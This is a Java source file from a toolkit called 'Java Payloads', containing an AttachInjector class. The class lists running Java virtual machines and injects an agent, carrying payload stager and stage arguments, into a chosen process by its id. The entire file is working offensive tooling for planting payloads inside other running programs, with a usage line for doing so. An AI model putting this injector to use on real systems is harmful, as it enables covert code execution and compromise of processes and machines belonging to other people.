/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.builder;

import java.io.PrintStream;
import java.util.List;

import javapayload.handler.stager.StagerHandler;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

public class AttachInjector {
	public static void main(String[] args) throws Exception {
		if (args.length == 1 && args[0].equals("list")) {
			listVMs(System.out);
			return;
		}
		if (args.length < 5) {
			System.out.println("Usage: java javapayload.builder.AttachInjector <pid> <agentPath> <stager> [stageroptions] -- <stage> [stageoptions]");
			return;
		}
		final String[] stagerArgs = new String[args.length - 2];
		for (int i = 2; i < args.length; i++) {
			stagerArgs[i - 2] = args[i];
		}
		inject(args[0], args[1], new StagerHandler.Loader(stagerArgs));
	}
	
	public static void inject(String pid, String agentPath, StagerHandler.Loader loader) throws Exception {
		loader.handleBefore(loader.stageHandler.consoleErr, null); // may modify stagerArgs
		String[] stagerArgs = loader.getArgs();
		final StringBuffer agentArgs = new StringBuffer();
		for (int i = 0; i < stagerArgs.length; i++) {
			if (i != 0) {
				agentArgs.append(" ");
			}
			agentArgs.append(stagerArgs[i]);
		}
		final VirtualMachine vm = VirtualMachine.attach(pid);
		vm.loadAgent(agentPath, agentArgs.toString());
		vm.detach();
		loader.handleAfter(loader.stageHandler.consoleErr, null);
	}

	public static void listVMs(PrintStream out) {
		List vms = VirtualMachine.list();
		for (int i = 0; i < vms.size(); i++) {
			VirtualMachineDescriptor desc = (VirtualMachineDescriptor) vms.get(i);
			out.println(desc.id()+"\t"+desc.displayName());
		}
	}
}
